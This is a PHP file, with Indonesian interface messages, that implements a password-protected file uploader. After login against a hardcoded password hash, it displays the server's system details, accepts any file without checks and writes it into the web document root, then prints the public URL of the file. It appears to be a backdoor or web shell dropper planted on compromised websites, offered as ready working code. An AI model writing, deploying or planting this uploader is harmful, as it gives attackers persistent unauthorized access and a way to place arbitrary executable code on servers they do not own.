<?php
session_start();

function show_login_page($message = "")
{
?>
    <!DOCTYPE html>
    <html lang="en">

    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login</title>
        <style>
            body {
                font-family: monospace;
                text-align: center;
                margin-top: 20%;
            }

            input[type="password"] {
                border: none;
                border-bottom: 1px solid black;
                padding: 5px;
            }

            input[type="password"]:focus {
                outline: none;
            }

            input[type="submit"] {
                border: none;
                padding: 5px 20px;
                background-color: #2e313d;
                color: #FFF;
                cursor: pointer;
            }

            .message {
                color: red;
                margin-bottom: 10px;
            }
        </style>
    </head>

    <body>
        <form action="" method="post">
            <?php if (!empty($message)) { ?>
                <div class="message"><?php echo htmlspecialchars($message); ?></div>
            <?php } ?>
            <input type="password" name="pass" placeholder="Password">
            <input type="submit" name="submit" value="Login">
        </form>
    </body>

    </html>
<?php
    exit;
}

function show_upload_page()
{
?>
    <!DOCTYPE html>
    <html lang="en">

    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Upload File</title>
    </head>

    <body>
        <h3><?php echo "<b>" . php_uname() . "</b>"; ?></h3>
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="idx_file">
            <input type="submit" name="upload" value="Upload">
        </form>
        <?php
        handle_file_upload();
        ?>
    </body>

    </html>
<?php
    exit;
}

function handle_file_upload()
{
    if (isset($_POST['upload']) && isset($_FILES['idx_file'])) {
        $root = $_SERVER['DOCUMENT_ROOT'];
        $file_name = basename($_FILES['idx_file']['name']);
        $dest = $root . '/' . $file_name;

        if (is_writable($root)) {
            if (@move_uploaded_file($_FILES['idx_file']['tmp_name'], $dest)) {
                $web = "http://" . $_SERVER['HTTP_HOST'] . "/";
                echo "Sukses upload -> <a href='$web$file_name' target='_blank'><b><u>$web$file_name</u></b></a>";
            } else {
                echo "Gagal upload di document root.";
            }
        } else {
            if (@move_uploaded_file($_FILES['idx_file']['tmp_name'], $file_name)) {
                echo "Sukses upload <b>$file_name</b> di folder ini.";
            } else {
                echo "Gagal upload.";
            }
        }
    }
}

// Gunakan hash password yang disediakan
$stored_hashed_password = '$2y$12$hN3rRYu1PB27GMhxsTcf0eF0l6xuw2P8pH4AQd2HFo2LIsqLjqH.S';

if (!isset($_SESSION['authenticated'])) {
    if (isset($_POST['pass'])) {
        if (password_verify($_POST['pass'], $stored_hashed_password)) {
            $_SESSION['authenticated'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            show_login_page("Password salah!");
        }
    } else {
        show_login_page();
    }
} else {
    show_upload_page();
}
?>
